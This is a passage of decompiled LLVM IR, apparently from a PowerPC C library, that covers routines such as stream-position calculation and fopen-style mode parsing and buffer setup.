  %v5_100127b0 = call i32 @function_10012bdc(i32 %v0_100127a8, i32* nonnull %stack_var_-56, i32 %v0_100127a4)
  %v1_100127b4 = icmp slt i32 %v5_100127b0, 0
  br i1 %v1_100127b4, label %dec_label_pc_100127f0, label %dec_label_pc_100127bc

dec_label_pc_100127bc:                            ; preds = %dec_label_pc_100127a4
  %v0_100127bc = load i32, i32* @r31, align 4
  %v1_100127bc = inttoptr i32 %v0_100127bc to i16*
  %v2_100127bc = load i16, i16* %v1_100127bc, align 2
  %v3_100127bc = zext i16 %v2_100127bc to i32
  store i32 %v3_100127bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100127c4 = add i32 %v0_100127bc, 8
  %v2_100127c4 = inttoptr i32 %v1_100127c4 to i32*
  %v3_100127c4 = load i32, i32* %v2_100127c4, align 4
  store i32 %v3_100127c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v3_100127cc = add i32 %v0_100127bc, 2
  %v4_100127cc = inttoptr i32 %v3_100127cc to i8*
  store i8 0, i8* %v4_100127cc, align 1
  %v0_100127d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100127d0 = and i32 %v0_100127d0, 65464
  store i32 %v1_100127d0, i32* %r0.global-to-local, align 4
  %v0_100127d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100127d4 = load i32, i32* @r31, align 4
  %v2_100127d4 = add i32 %v1_100127d4, 44
  %v3_100127d4 = inttoptr i32 %v2_100127d4 to i32*
  store i32 %v0_100127d4, i32* %v3_100127d4, align 4
  %v0_100127d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127d8 = load i32, i32* @r31, align 4
  %v2_100127d8 = add i32 %v1_100127d8, 28
  %v3_100127d8 = inttoptr i32 %v2_100127d8 to i32*
  store i32 %v0_100127d8, i32* %v3_100127d8, align 4
  %v0_100127dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100127dc = trunc i32 %v0_100127dc to i16
  %v2_100127dc = load i32, i32* @r31, align 4
  %v3_100127dc = inttoptr i32 %v2_100127dc to i16*
  store i16 %v1_100127dc, i16* %v3_100127dc, align 2
  %v0_100127e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127e0 = load i32, i32* @r31, align 4
  %v2_100127e0 = add i32 %v1_100127e0, 16
  %v3_100127e0 = inttoptr i32 %v2_100127e0 to i32*
  store i32 %v0_100127e0, i32* %v3_100127e0, align 4
  %v0_100127e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127e4 = load i32, i32* @r31, align 4
  %v2_100127e4 = add i32 %v1_100127e4, 20
  %v3_100127e4 = inttoptr i32 %v2_100127e4 to i32*
  store i32 %v0_100127e4, i32* %v3_100127e4, align 4
  %v0_100127e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127e8 = load i32, i32* @r31, align 4
  %v2_100127e8 = add i32 %v1_100127e8, 24
  %v3_100127e8 = inttoptr i32 %v2_100127e8 to i32*
  store i32 %v0_100127e8, i32* %v3_100127e8, align 4
  br label %dec_label_pc_100127f4

dec_label_pc_100127f0:                            ; preds = %dec_label_pc_10012778, %dec_label_pc_100127a4, %dec_label_pc_10012790
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_100127f4

dec_label_pc_100127f4:                            ; preds = %dec_label_pc_100127bc, %dec_label_pc_100127f0
  %v0_100127f4 = load i32, i32* @r28, align 4
  %v3_100127f4 = icmp eq i32 %v0_100127f4, 0
  br i1 %v3_100127f4, label %dec_label_pc_100127fc, label %dec_label_pc_10012808

dec_label_pc_100127fc:                            ; preds = %dec_label_pc_100127f4
  %v2_100127fc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100127fc, i32* @r3, align 4
  %v0_10012804 = call i32 @function_10010048()
  br label %dec_label_pc_10012808

dec_label_pc_10012808:                            ; preds = %dec_label_pc_100127f4, %dec_label_pc_1001272c, %dec_label_pc_100127fc
  store i32 %v0_10012708, i32* %r0.global-to-local, align 4
  %v0_1001280c = load i32, i32* @r30, align 4
  ret i32 %v0_1001280c

; uselistorder directives
  uselistorder i32 %v0_100126f8, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012808, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100127f4, { 1, 0 }
  uselistorder label %dec_label_pc_100127f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100127a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001276c, { 1, 0 }
}

define i32 @function_10012820(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10012820:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10012838 = load i16, i16* %arg1, align 2
  %v4_10012838 = zext i16 %v3_10012838 to i32
  %tmp9 = urem i16 %v3_10012838, 4
  %v3_1001283c = icmp eq i16 %tmp9, 0
  br i1 %v3_1001283c, label %dec_label_pc_10012888, label %dec_label_pc_10012844

dec_label_pc_10012844:                            ; preds = %dec_label_pc_10012820
  %v1_1001283c = zext i16 %tmp9 to i32
  %v1_10012844 = add nsw i32 %v1_1001283c, -1
  store i32 %v1_10012844, i32* %r10.global-to-local, align 4
  %v4_10012844 = icmp eq i32 %v1_10012844, 0
  br i1 %v4_10012844, label %dec_label_pc_10012888, label %dec_label_pc_1001284c

dec_label_pc_1001284c:                            ; preds = %dec_label_pc_10012844
  %v1_1001284c = and i32 %v4_10012838, 2048
  %v3_1001284c = icmp eq i32 %v1_1001284c, 0
  br i1 %v3_1001284c, label %dec_label_pc_10012888, label %dec_label_pc_10012854

dec_label_pc_10012854:                            ; preds = %dec_label_pc_1001284c
  %v2_10012854 = icmp sgt i32 %v1_10012844, 1
  br i1 %v2_10012854, label %dec_label_pc_10012900, label %dec_label_pc_1001285c

dec_label_pc_1001285c:                            ; preds = %dec_label_pc_10012854
  %v2_1001285c = add i32 %tmp, 40
  %v3_1001285c = inttoptr i32 %v2_1001285c to i32*
  %v4_1001285c = load i32, i32* %v3_1001285c, align 4
  %v3_10012860 = icmp eq i32 %v4_1001285c, 0
  br i1 %v3_10012860, label %dec_label_pc_10012868, label %dec_label_pc_10012900

dec_label_pc_10012868:                            ; preds = %dec_label_pc_1001285c
  %v2_10012868 = add i32 %tmp, 44
  %v3_10012868 = inttoptr i32 %v2_10012868 to i32*
  %v4_10012868 = load i32, i32* %v3_10012868, align 4
  %v2_1001286c = add i32 %tmp, 3
  %v3_1001286c = inttoptr i32 %v2_1001286c to i8*
  %v4_1001286c = load i8, i8* %v3_1001286c, align 1
  %v5_1001286c = zext i8 %v4_1001286c to i32
  %v2_10012874 = sub nsw i32 %v1_10012844, %v5_1001286c
  %v1_10012878 = add nsw i32 %v2_10012874, -1
  store i32 %v1_10012878, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10012868, 1
  br i1 %tmp7, label %dec_label_pc_10012888, label %dec_label_pc_10012880

dec_label_pc_10012880:                            ; preds = %dec_label_pc_10012868
  %v2_10012880 = add i32 %tmp, 2
  %v3_10012880 = inttoptr i32 %v2_10012880 to i8*
  %v4_10012880 = load i8, i8* %v3_10012880, align 1
  %v5_10012880 = zext i8 %v4_10012880 to i32
  %v2_10012884 = sub nsw i32 %v1_10012878, %v5_10012880
  store i32 %v2_10012884, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012888:                            ; preds = %dec_label_pc_10012868, %dec_label_pc_1001284c, %dec_label_pc_10012844, %dec_label_pc_10012820, %dec_label_pc_10012880
  %v0_100128ac = phi i32 [ %v1_10012878, %dec_label_pc_10012868 ], [ %v1_10012844, %dec_label_pc_1001284c ], [ 0, %dec_label_pc_10012844 ], [ 0, %dec_label_pc_10012820 ], [ %v2_10012884, %dec_label_pc_10012880 ]
  %v1_10012888 = and i32 %v4_10012838, 64
  %v3_10012888 = icmp eq i32 %v1_10012888, 0
  %storemerge.in.in.v = select i1 %v3_10012888, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1001289c = add i32 %tmp, 16
  %v3_1001289c = inttoptr i32 %v2_1001289c to i32*
  %v4_1001289c = load i32, i32* %v3_1001289c, align 4
  %v1_100128a0 = inttoptr i32 %arg2 to i32*
  %v2_100128a0 = load i32, i32* %v1_100128a0, align 4
  store i32 %v2_100128a0, i32* %r4.global-to-local, align 4
  %v1_100128a4 = add i32 %arg2, 4
  %v2_100128a4 = inttoptr i32 %v1_100128a4 to i32*
  %v3_100128a4 = load i32, i32* %v2_100128a4, align 4
  store i32 %v3_100128a4, i32* %r5.global-to-local, align 4
  %v2_100128a8 = sub i32 %storemerge, %v4_1001289c
  %v2_100128ac = add i32 %v2_100128a8, %v0_100128ac
  store i32 %v2_100128ac, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_100128ac, 0
  %v1_100128b4 = zext i1 %tmp10 to i32
  %v2_100128b4 = ashr i32 %v2_100128ac, 31
  %v3_100128b4 = and i32 %v2_100128b4, -2
  %v4_100128b4 = or i32 %v3_100128b4, %v1_100128b4
  %v2_100128b8 = sub i32 %v3_100128a4, %v2_100128ac
  %v3_100128b8 = sub i32 -1, %v2_100128ac
  store i32 %v2_100128b8, i32* %r10.global-to-local, align 4
  %v6_100128b8 = icmp ule i32 %v2_100128b8, %v3_100128b8
  %v2_100128bc = sub nsw i32 -1, %v4_100128b4
  %v3_100128bc = add i32 %v2_100128a0, %v2_100128bc
  %v5_100128bc = zext i1 %v6_100128b8 to i32
  %v6_100128bc = add i32 %v3_100128bc, %v5_100128bc
  store i32 %v6_100128bc, i32* %v1_100128a0, align 4
  %v0_100128c4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100128c4 = load i32, i32* @r8, align 4
  %v2_100128c4 = add i32 %v1_100128c4, 4
  %v3_100128c4 = inttoptr i32 %v2_100128c4 to i32*
  store i32 %v0_100128c4, i32* %v3_100128c4, align 4
  %v0_100128c8 = load i32, i32* @r8, align 4
  %v1_100128c8 = inttoptr i32 %v0_100128c8 to i32*
  %v2_100128c8 = load i32, i32* %v1_100128c8, align 4
  %v1_100128cc = load i32, i32* %r4.global-to-local, align 4
  %v3_100128cc = icmp sgt i32 %v2_100128c8, %v1_100128cc
  br i1 %v3_100128cc, label %dec_label_pc_100128e4, label %dec_label_pc_100128d4

dec_label_pc_100128d4:                            ; preds = %dec_label_pc_10012888
  %v4_100128cc = icmp eq i32 %v2_100128c8, %v1_100128cc
  br i1 %v4_100128cc, label %dec_label_pc_100128d8, label %dec_label_pc_100128e8thread-pre-split

dec_label_pc_100128d8:                            ; preds = %dec_label_pc_100128d4
  %v1_100128d8 = add i32 %v0_100128c8, 4
  %v2_100128d8 = inttoptr i32 %v1_100128d8 to i32*
  %v3_100128d8 = load i32, i32* %v2_100128d8, align 4
  %v1_100128dc = load i32, i32* %r5.global-to-local, align 4
  %v3_100128dc = icmp ugt i32 %v3_100128d8, %v1_100128dc
  br i1 %v3_100128dc, label %dec_label_pc_100128e4, label %dec_label_pc_100128e8thread-pre-split

dec_label_pc_100128e4:                            ; preds = %dec_label_pc_100128d8, %dec_label_pc_10012888
  %v0_100128e4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100128e4 = sub i32 0, %v0_100128e4
  store i32 %v1_100128e4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100128e8

dec_label_pc_100128e8thread-pre-split:            ; preds = %dec_label_pc_100128d4, %dec_label_pc_100128d8
  %v0_100128e8.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100128e8

dec_label_pc_100128e8:                            ; preds = %dec_label_pc_100128e8thread-pre-split, %dec_label_pc_100128e4
  %v0_100128e8 = phi i32 [ %v0_100128e8.pr, %dec_label_pc_100128e8thread-pre-split ], [ %v1_100128e4, %dec_label_pc_100128e4 ]
  %tmp8 = icmp sgt i32 %v0_100128e8, -1
  br i1 %tmp8, label %dec_label_pc_10012904, label %dec_label_pc_100128f0

dec_label_pc_100128f0:                            ; preds = %dec_label_pc_100128e8
  %v0_100128f0 = call i32 @function_1000c85c()
  %v2_100128f8 = inttoptr i32 %v0_100128f0 to i32*
  store i32 75, i32* %v2_100128f8, align 4
  %v0_10012908.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012904

dec_label_pc_10012900:                            ; preds = %dec_label_pc_1001285c, %dec_label_pc_10012854
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012904

dec_label_pc_10012904:                            ; preds = %dec_label_pc_100128e8, %dec_label_pc_100128f0, %dec_label_pc_10012900
  %v0_10012908 = phi i32 [ %v0_100128e8, %dec_label_pc_100128e8 ], [ %v0_10012908.pre, %dec_label_pc_100128f0 ], [ -1, %dec_label_pc_10012900 ]
  ret i32 %v0_10012908

; uselistorder directives
  uselistorder i32 %v2_100128c8, { 1, 0 }
  uselistorder i32 %v2_100128ac, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 2048, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10012904, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100128e8thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10012888, { 4, 0, 1, 2, 3 }
}

define i32 @function_1001291c(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_1001291c:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10012920 = load i32, i32* @lr, align 4
  store i32 %v0_10012920, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10012930 = load i32, i32* @r5, align 4
  store i32 %v0_10012930, i32* @r31, align 4
  %v0_10012934 = load i32, i32* @r6, align 4
  store i32 %v0_10012934, i32* @r29, align 4
  %v3_10012938 = load i8, i8* %arg2, align 1
  %v4_10012938 = zext i8 %v3_10012938 to i32
  store i32 %v4_10012938, i32* %r0.global-to-local, align 4
  %v3_1001293c = icmp eq i8 %v3_10012938, 114
  br i1 %v3_1001293c, label %dec_label_pc_10012988, label %dec_label_pc_10012944

dec_label_pc_10012944:                            ; preds = %dec_label_pc_1001291c
  %v3_10012944 = icmp eq i8 %v3_10012938, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10012944, label %dec_label_pc_1001298c, label %dec_label_pc_10012950

dec_label_pc_10012950:                            ; preds = %dec_label_pc_10012944
  %v3_10012950 = icmp eq i8 %v3_10012938, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10012950, label %dec_label_pc_1001298c, label %dec_label_pc_1001295c

dec_label_pc_1001295c:                            ; preds = %dec_label_pc_10012a1c, %dec_label_pc_100129ec, %dec_label_pc_10012950
  %v0_1001295c = call i32 @function_1000c85c()
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_10012964 = load i32, i32* @r31, align 4
  %v3_10012964 = icmp eq i32 %v0_10012964, 0
  %v2_10012968 = inttoptr i32 %v0_1001295c to i32*
  store i32 22, i32* %v2_10012968, align 4
  br i1 %v3_10012964, label %dec_label_pc_10012bc0, label %dec_label_pc_10012970

dec_label_pc_10012970:                            ; preds = %dec_label_pc_10012a50, %dec_label_pc_1001295c
  %v0_10012970 = load i32, i32* @r31, align 4
  %v1_10012970 = inttoptr i32 %v0_10012970 to i16*
  %v2_10012970 = load i16, i16* %v1_10012970, align 2
  %v3_10012970 = zext i16 %v2_10012970 to i32
  store i32 %v3_10012970, i32* %r0.global-to-local, align 4
  %v1_10012974 = and i32 %v3_10012970, 8192
  store i32 %v1_10012974, i32* %r9.global-to-local, align 4
  %v3_10012974 = icmp eq i32 %v1_10012974, 0
  br i1 %v3_10012974, label %dec_label_pc_10012bc0, label %dec_label_pc_1001297c

dec_label_pc_1001297c:                            ; preds = %dec_label_pc_10012970
  store i32 ptrtoint (i32* @global_var_10012984.836 to i32), i32* @lr, align 4
  %v2_10012980 = call i32 @function_1000f0b8(i32 %v0_10012970)
  br label %dec_label_pc_10012bc0

dec_label_pc_10012988:                            ; preds = %dec_label_pc_1001291c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001298c

dec_label_pc_1001298c:                            ; preds = %dec_label_pc_10012950, %dec_label_pc_10012944, %dec_label_pc_10012988
  %v0_100129ac = phi i32 [ 1089, %dec_label_pc_10012950 ], [ 577, %dec_label_pc_10012944 ], [ 1, %dec_label_pc_10012988 ]
  %v2_1001298c = add i32 %tmp, 1
  %v3_1001298c = inttoptr i32 %v2_1001298c to i8*
  %v4_1001298c = load i8, i8* %v3_1001298c, align 1
  %v5_1001298c = zext i8 %v4_1001298c to i32
  store i32 %v5_1001298c, i32* %r0.global-to-local, align 4
  %v3_10012994 = icmp eq i8 %v4_1001298c, 98
  br i1 %v3_10012994, label %dec_label_pc_100129a0, label %dec_label_pc_1001299c

dec_label_pc_1001299c:                            ; preds = %dec_label_pc_1001298c
  br label %dec_label_pc_100129a0

dec_label_pc_100129a0:                            ; preds = %dec_label_pc_1001298c, %dec_label_pc_1001299c
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1001299c ], [ %v2_1001298c, %dec_label_pc_1001298c ]
  %v0_100129a0 = phi i32 [ %tmp, %dec_label_pc_1001299c ], [ %v2_1001298c, %dec_label_pc_1001298c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100129a0 = add i32 %v0_100129a0, 1
  %v2_100129a0 = inttoptr i32 %v1_100129a0 to i8*
  %v3_100129a0 = load i8, i8* %v2_100129a0, align 1
  %v4_100129a0 = zext i8 %v3_100129a0 to i32
  store i32 %v4_100129a0, i32* %r0.global-to-local, align 4
  %v3_100129a4 = icmp eq i8 %v3_100129a0, 43
  br i1 %v3_100129a4, label %dec_label_pc_100129ac, label %dec_label_pc_100129b4

dec_label_pc_100129ac:                            ; preds = %dec_label_pc_100129a0
  store i32 %v0_100129ac, i32* %r9.global-to-local, align 4
  %v1_100129b0 = add nuw nsw i32 %v0_100129ac, 1
  store i32 %v1_100129b0, i32* @r28, align 4
  br label %dec_label_pc_100129b4

dec_label_pc_100129b4:                            ; preds = %dec_label_pc_100129a0, %dec_label_pc_100129ac
  %v3_100129b4 = icmp eq i32 %v0_10012930, 0
  br i1 %v3_100129b4, label %dec_label_pc_100129bc, label %dec_label_pc_100129e4

dec_label_pc_100129bc:                            ; preds = %dec_label_pc_100129b4
  store i32 268511684, i32* @lr, align 4
  %v1_100129c0 = call i32 @function_1000ef60(i32 80)
  store i32 %v1_100129c0, i32* @r31, align 4
  %v4_100129c4 = icmp eq i32 %v1_100129c0, 0
  br i1 %v4_100129c4, label %dec_label_pc_10012bc4, label %dec_label_pc_100129cc

dec_label_pc_100129cc:                            ; preds = %dec_label_pc_100129bc
  %v1_100129d0 = add i32 %v1_100129c0, 56
  store i32 %v1_100129d0, i32* @r3, align 4
  %v3_100129d4 = inttoptr i32 %v1_100129c0 to i16*
  store i16 8192, i16* %v3_100129d4, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100129dc = load i32, i32* @r31, align 4
  %v2_100129dc = add i32 %v1_100129dc, 8
  %v3_100129dc = inttoptr i32 %v2_100129dc to i32*
  store i32 0, i32* %v3_100129dc, align 4
  store i32 268511716, i32* @lr, align 4
  %v0_100129e0 = call i32 @function_1000ca34()
  %v0_100129e4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100129e4

dec_label_pc_100129e4:                            ; preds = %dec_label_pc_100129b4, %dec_label_pc_100129cc
  %v0_10012a44 = phi i32 [ %v0_10012934, %dec_label_pc_100129b4 ], [ %v0_100129e4.pre, %dec_label_pc_100129cc ]
  %v1_100129e4 = icmp slt i32 %v0_10012a44, 0
  br i1 %v1_100129e4, label %dec_label_pc_10012a44, label %dec_label_pc_100129ec

dec_label_pc_100129ec:                            ; preds = %dec_label_pc_100129e4
  %v1_100129f0 = add i32 %arg1, 1
  store i32 %v1_100129f0, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_100129f8 = load i32, i32* @r31, align 4
  %v2_100129f8 = add i32 %v1_100129f8, 4
  %v3_100129f8 = inttoptr i32 %v2_100129f8 to i32*
  store i32 %v0_10012a44, i32* %v3_100129f8, align 4
  %v0_100129fc = load i32, i32* @r28, align 4
  %v1_100129fc = load i32, i32* %r9.global-to-local, align 4
  %v2_100129fc = and i32 %v1_100129fc, %v0_100129fc
  %v1_10012a00 = add i32 %v2_100129fc, 1
  store i32 %v1_10012a00, i32* %r9.global-to-local, align 4
  %v1_10012a04 = load i32, i32* %r0.global-to-local, align 4
  %v2_10012a04 = and i32 %v1_10012a04, %v1_10012a00
  store i32 %v2_10012a04, i32* %r0.global-to-local, align 4
  %v4_10012a08 = icmp eq i32 %v2_10012a04, %v1_10012a00
  br i1 %v4_10012a08, label %dec_label_pc_10012a10, label %dec_label_pc_1001295c

dec_label_pc_10012a10:                            ; preds = %dec_label_pc_100129ec
  %v2_10012a10 = sub i32 -1, %arg1
  %v3_10012a10 = and i32 %v0_100129fc, %v2_10012a10
  store i32 %v3_10012a10, i32* %r0.global-to-local, align 4
  %v1_10012a14 = and i32 %v3_10012a10, 1024
  store i32 %v1_10012a14, i32* %r9.global-to-local, align 4
  %v3_10012a14 = icmp eq i32 %v1_10012a14, 0
  br i1 %v3_10012a14, label %dec_label_pc_10012a38, label %dec_label_pc_10012a1c

dec_label_pc_10012a1c:                            ; preds = %dec_label_pc_10012a10
  %v0_10012a1c = load i32, i32* @r29, align 4
  store i32 268511792, i32* @lr, align 4
  %v2_10012a2c = call i32 @function_1000c140(i32 %v0_10012a1c, i32 4)
  %v3_10012a30 = icmp eq i32 %v2_10012a2c, 0
  br i1 %v3_10012a30, label %dec_label_pc_10012a38, label %dec_label_pc_1001295c

dec_label_pc_10012a38:                            ; preds = %dec_label_pc_10012a1c, %dec_label_pc_10012a10
  %v1_10012a38 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10012a38, i32* %r0.global-to-local, align 4
  %v0_10012a3c = load i32, i32* @r28, align 4
  %v2_10012a3c = or i32 %v0_10012a3c, %v1_10012a38
  store i32 %v2_10012a3c, i32* @r28, align 4
  br label %dec_label_pc_10012a70

dec_label_pc_10012a44:                            ; preds = %dec_label_pc_100129e4
  %v3_10012a44 = icmp eq i32 %v0_10012a44, -1
  %v0_10012a54.pre = load i32, i32* @r28, align 4
  br i1 %v3_10012a44, label %dec_label_pc_10012a50, label %dec_label_pc_10012a4c

dec_label_pc_10012a4c:                            ; preds = %dec_label_pc_10012a44
  %v1_10012a4c = or i32 %v0_10012a54.pre, 65536
  store i32 %v1_10012a4c, i32* @r28, align 4
  br label %dec_label_pc_10012a50

dec_label_pc_10012a50:                            ; preds = %dec_label_pc_10012a44, %dec_label_pc_10012a4c
  %v0_10012a54 = phi i32 [ %v1_10012a4c, %dec_label_pc_10012a4c ], [ %v0_10012a54.pre, %dec_label_pc_10012a44 ]
  store i32 438, i32* @r5, align 4
  store i32 268511844, i32* @lr, align 4
  %v2_10012a60 = call i32 @function_1000c524(i32 %arg1, i32 %v0_10012a54)
  %v1_10012a64 = icmp slt i32 %v2_10012a60, 0
  %v1_10012a68 = load i32, i32* @r31, align 4
  %v2_10012a68 = add i32 %v1_10012a68, 4
  %v3_10012a68 = inttoptr i32 %v2_10012a68 to i32*
  store i32 %v2_10012a60, i32* %v3_10012a68, align 4
  br i1 %v1_10012a64, label %dec_label_pc_10012970, label %dec_label_pc_10012a50.dec_label_pc_10012a70_crit_edge

dec_label_pc_10012a50.dec_label_pc_10012a70_crit_edge: ; preds = %dec_label_pc_10012a50
  %v0_10012a74.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10012a70

dec_label_pc_10012a70:                            ; preds = %dec_label_pc_10012a50.dec_label_pc_10012a70_crit_edge, %dec_label_pc_10012a38
  %v0_10012a74 = phi i32 [ %v0_10012a74.pre, %dec_label_pc_10012a50.dec_label_pc_10012a70_crit_edge ], [ %v2_10012a3c, %dec_label_pc_10012a38 ]
  %v0_10012a70 = load i32, i32* @r31, align 4
  %v1_10012a70 = inttoptr i32 %v0_10012a70 to i16*
  %v2_10012a70 = load i16, i16* %v1_10012a70, align 2
  %v3_10012a70 = zext i16 %v2_10012a70 to i32
  store i32 %v3_10012a70, i32* %r0.global-to-local, align 4
  %v1_10012a74 = urem i32 %v0_10012a74, 4
  store i32 %v1_10012a74, i32* %r29.global-to-local, align 4
  %v1_10012a78 = call i32 @__asm_rlwinm(i32 %v0_10012a74, i32 0, i32 21, i32 21)
  %v1_10012a7c = add nuw nsw i32 %v1_10012a74, 1
  %v1_10012a80 = xor i32 %v1_10012a7c, 3
  store i32 %v1_10012a80, i32* %r29.global-to-local, align 4
  %v1_10012a84 = call i32 @__asm_rlwinm(i32 %v3_10012a70, i32 0, i32 18, i32 18)
  %v2_10012a84 = trunc i32 %v1_10012a84 to i16
  store i32 %v1_10012a84, i32* %r0.global-to-local, align 4
  %v1_10012a88 = mul nuw nsw i32 %v1_10012a80, 16
  store i32 %v1_10012a88, i32* %r29.global-to-local, align 4
  %v3_10012a8c = load i32, i32* @r31, align 4
  %v4_10012a8c = inttoptr i32 %v3_10012a8c to i16*
  store i16 %v2_10012a84, i16* %v4_10012a8c, align 2
  %v0_10012a90 = load i32, i32* @r28, align 4
  %v1_10012a90 = call i32 @__asm_rlwinm(i32 %v0_10012a90, i32 31, i32 16, i32 16)
  %v2_10012a94 = or i32 %v1_10012a90, %v1_10012a78
  store i32 %v2_10012a94, i32* %r0.global-to-local, align 4
  %v0_10012a98 = load i32, i32* @r31, align 4
  %v1_10012a98 = inttoptr i32 %v0_10012a98 to i16*
  %v2_10012a98 = load i16, i16* %v1_10012a98, align 2
  %v3_10012a98 = zext i16 %v2_10012a98 to i32
  %v2_10012a9c = or i32 %v3_10012a98, %v2_10012a94
  store i32 %v2_10012a9c, i32* %r9.global-to-local, align 4
  %v0_10012aa0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10012aa0 = or i32 %v2_10012a9c, %v0_10012aa0
  store i32 %v2_10012aa0, i32* @r29, align 4
  %v1_10012aa4 = trunc i32 %v2_10012aa0 to i16
  store i16 %v1_10012aa4, i16* %v1_10012a98, align 2
  %v0_10012aa8 = call i32 @function_1000c85c()
  store i32 %v0_10012aa8, i32* @r28, align 4
  %v0_10012ab0 = load i32, i32* @r31, align 4
  %v1_10012ab0 = add i32 %v0_10012ab0, 4
  %v2_10012ab0 = inttoptr i32 %v1_10012ab0 to i32*
  %v3_10012ab0 = load i32, i32* %v2_10012ab0, align 4
  %v1_10012ab4 = inttoptr i32 %v0_10012aa8 to i32*
  %v2_10012ab4 = load i32, i32* %v1_10012ab4, align 4
  store i32 %v2_10012ab4, i32* @r27, align 4
  store i32 268511932, i32* @lr, align 4
  %v1_10012ab8 = call i32 @function_1000e460(i32 %v3_10012ab0)
  %v1_10012abc = mul i32 %v1_10012ab8, 256
  %v0_10012ac0 = load i32, i32* @r29, align 4
  %v2_10012ac0 = or i32 %v0_10012ac0, %v1_10012abc
  store i32 %v2_10012ac0, i32* @r29, align 4
  %v1_10012ac4 = trunc i32 %v2_10012ac0 to i16
  %v2_10012ac4 = load i32, i32* @r31, align 4
  %v3_10012ac4 = inttoptr i32 %v2_10012ac4 to i16*
  store i16 %v1_10012ac4, i16* %v3_10012ac4, align 2
  %v0_10012ac8 = load i32, i32* @r27, align 4
  %v1_10012ac8 = load i32, i32* @r28, align 4
  %v2_10012ac8 = inttoptr i32 %v1_10012ac8 to i32*
  store i32 %v0_10012ac8, i32* %v2_10012ac8, align 4
  %v0_10012acc = load i32, i32* @r31, align 4
  %v1_10012acc = add i32 %v0_10012acc, 8
  %v2_10012acc = inttoptr i32 %v1_10012acc to i32*
  %v3_10012acc = load i32, i32* %v2_10012acc, align 4
  store i32 %v3_10012acc, i32* %r0.global-to-local, align 4
  %v3_10012ad0 = icmp eq i32 %v3_10012acc, 0
  br i1 %v3_10012ad0, label %dec_label_pc_10012ad8, label %dec_label_pc_10012b08

dec_label_pc_10012ad8:                            ; preds = %dec_label_pc_10012a70
  store i32 268511968, i32* @lr, align 4
  %v1_10012adc = call i32 @function_1000ef60(i32 4096)
  %v3_10012ae0 = icmp eq i32 %v1_10012adc, 0
  %v1_10012ae4 = load i32, i32* @r31, align 4
  %v2_10012ae4 = add i32 %v1_10012ae4, 8
  %v3_10012ae4 = inttoptr i32 %v2_10012ae4 to i32*
  store i32 %v1_10012adc, i32* %v3_10012ae4, align 4
  %v1_10012b04 = load i32, i32* @r31, align 4
  br i1 %v3_10012ae0, label %dec_label_pc_10012b04, label %dec_label_pc_10012aec

dec_label_pc_10012aec:                            ; preds = %dec_label_pc_10012ad8
  %v1_10012aec = inttoptr i32 %v1_10012b04 to i16*
  %v2_10012aec = load i16, i16* %v1_10012aec, align 2
